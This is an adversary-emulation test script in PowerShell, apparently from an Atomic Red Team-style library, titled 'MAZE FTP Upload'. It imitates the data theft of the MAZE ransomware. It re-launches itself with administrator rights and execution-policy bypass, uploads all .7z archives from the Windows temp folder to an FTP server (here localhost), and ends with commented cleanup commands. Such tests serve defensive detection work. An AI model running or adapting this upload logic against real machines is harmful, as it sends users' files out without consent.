#Atomic Test #6 - MAZE FTP Upload

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

$Dir_to_copy = "$env:windir\temp"
$ftp = "ftp://127.0.0.1/"
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('', '')
if (test-connection -count 1 -computername "127.0.0.1" -quiet){
    foreach($file in (dir $Dir_to_copy "*.7z")){
        echo "Uploading $file..."
        $uri = New-Object System.Uri($ftp+$file.name)
        $web_client.UploadFile($uri, $file.FullName)
    }
}else{
    echo "FTP Server Unreachable. Please verify the server address in input args and try again."
}

#Cleanup Commands:
# $ftp = "ftp://127.0.0.1/"
# try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
# {$uri = New-Object System.Uri($ftp+$file.name)
#  $ftp_del = [System.Net.FtpWebRequest]::create($uri)
#  $ftp_del.Credentials = New-Object System.Net.NetworkCredential('','')
#  $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
#  $ftp_del.GetResponse()}} catch{}